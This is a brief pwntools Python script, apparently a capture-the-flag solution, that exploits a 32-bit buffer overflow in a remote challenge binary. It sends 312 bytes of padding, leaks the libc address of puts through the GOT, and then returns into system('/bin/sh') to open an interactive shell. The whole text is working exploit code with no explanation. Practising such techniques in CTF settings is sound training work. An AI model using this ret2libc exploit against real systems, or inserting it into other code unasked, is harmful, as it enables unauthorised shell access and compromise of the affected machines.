#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './chall')
libc = ELF(exe.libc.path)

io = remote("chall.v1t.site", 30212)
io.sendlineafter(b"here!", b"A"*312 + p32(exe.plt.puts) + p32(exe.sym.main) + p32(exe.got.puts))

libc.address = u32(io.recvlines(3)[1]) - libc.sym.puts

io.sendlineafter(b"here!", b"A"*312 + p32(libc.sym.system) + p32(0x0) + p32(next(libc.search(b"/bin/sh\x00"))))
io.interactive()
